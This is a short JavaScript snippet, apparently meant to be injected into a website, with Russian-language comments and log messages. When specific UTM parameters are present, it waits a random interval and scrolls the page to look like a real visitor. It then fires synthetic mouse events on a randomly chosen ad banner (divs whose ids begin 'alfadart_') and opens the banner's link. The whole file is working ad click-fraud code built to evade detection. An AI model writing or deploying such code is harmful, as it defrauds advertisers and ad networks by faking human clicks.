(function() {
    'use strict';
    
    function getUtmParams() {
        const urlParams = new URLSearchParams(window.location.search);
        return {
            source: urlParams.get('utm_source'),
            medium: urlParams.get('utm_medium'),
            campaign: urlParams.get('utm_campaign')
        };
    }
    
    function checkUtmConditions() {
        const utm = getUtmParams();
        return utm.source === 'google' && 
               utm.medium === 'organic' && 
               utm.campaign === 'promo';
    }
    
    function simulateHumanBehavior(callback) {
        const delay = Math.floor(Math.random() * 5000) + 2000;
        
        setTimeout(() => {
            window.scrollTo({
                top: Math.random() * 500,
                behavior: 'smooth'
            });
            
            setTimeout(callback, Math.random() * 1000 + 500);
        }, delay);
    }
    
    function getAlfasenseBanners() {
        const bannerDivs = document.querySelectorAll('div[id^="alfadart_"]');
        return Array.from(bannerDivs);
    }
    
    function simulateBannerClick(bannerElement) {
        if (!bannerElement) return false;
        
        try {
            const events = ['mouseover', 'mousedown', 'mouseup', 'click'];
            
            events.forEach(eventType => {
                const event = new MouseEvent(eventType, {
                    view: window,
                    bubbles: true,
                    cancelable: true,
                    clientX: Math.random() * 100 + 50, // Случайная позиция X
                    clientY: Math.random() * 100 + 50  // Случайная позиция Y
                });
                bannerElement.dispatchEvent(event);
            });
            
            const link = bannerElement.querySelector('a');
            if (link && link.href) {
                window.open(link.href, '_blank');
                return true;
            }
            
            return true;
        } catch (error) {
            console.error('Ошибка при клике по баннеру:', error);
            return false;
        }
    }
    
    function executeBannerClick() {
        if (!checkUtmConditions()) {
            console.log('не активирован');
            return;
        }
        
        console.log('условия выполнены');
        
        setTimeout(() => {
            const banners = getAlfasenseBanners();
            
            if (banners.length === 0) {
                console.log('не найдены');
                return;
            }
            
            const randomBanner = banners[Math.floor(Math.random() * banners.length)];
            
            simulateHumanBehavior(() => {
                const clicked = simulateBannerClick(randomBanner);
                
                if (clicked) {
                    console.log('выполнен');
                    
                    localStorage.setItem('banner_clicked_' + window.location.pathname, 'true');
                }
            });
            
        }, 1000);
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', executeBannerClick);
    } else {
        executeBannerClick();
    }
    
})();
